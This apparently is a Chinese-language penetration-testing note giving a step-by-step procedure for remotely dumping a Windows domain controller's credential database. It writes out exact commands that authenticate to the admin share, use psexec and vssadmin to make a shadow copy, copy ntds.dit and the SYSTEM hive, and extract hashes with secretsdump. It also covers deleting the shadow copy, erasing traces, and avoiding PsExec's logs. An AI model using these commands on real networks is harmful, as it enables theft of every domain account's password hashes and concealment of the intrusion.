使用 shell 远程转储”DC” 用户数据库

Demo:

  1. 远程连接到DC
  2. 使用psexec 调用vssadmin
  3. 查看结果 》》也可以使用 “>>”将结果传回本地。
  4. 创建卷影

    查看一下结果

  5. 复制ntds.dit
  6. 复制system (解开ntds需要使用)

    查看一下结果

  7. 文件可能很大，可灵活选择在DC上解密或者下载回本地

    secretsdump.exe -ntds ntds.dit -system SYSTEM local

  8. 删除卷影
  9. 删除痕迹。。。。。。

命令：

net use \192.168.1.38\C$ “Admin12345” /user:god\administrator
psexec \192.168.1.38 -h cmd /c “vssadmin list shadows >> C:\out.txt”
type \192.168.1.38\C$\out.txt
psexec \192.168.1.38 -h cmd /c “vssadmin create shadow /for=c: > C:\out.txt”
type \192.168.1.38\C$\out.txt
psexec \192.168.1.38 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:"
dir \192.168.1.38\C$
psexec \192.168.1.38 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system C:"
dir \192.168.1.38\C$
psexec \192.168.1.38 -h cmd /c “vssadmin delete shadows /for=c: /quiet”

可以参照——– 内网渗透 Tips1抓取域内用户的hash

PS:

  1. PsExec 会留下操作日志。
  2. PsExec 异常退出会在目标上保留进程。
  3. 低版本PsExec 明文传输。。。。
  4. PsExec工作方式原理 https://www.itprotoday.com/compute-engines/psexec
  5. PsExec 返回的错误代码特定于您执行的应用程序，而不是PsExec
  6. wmi 更好一点。
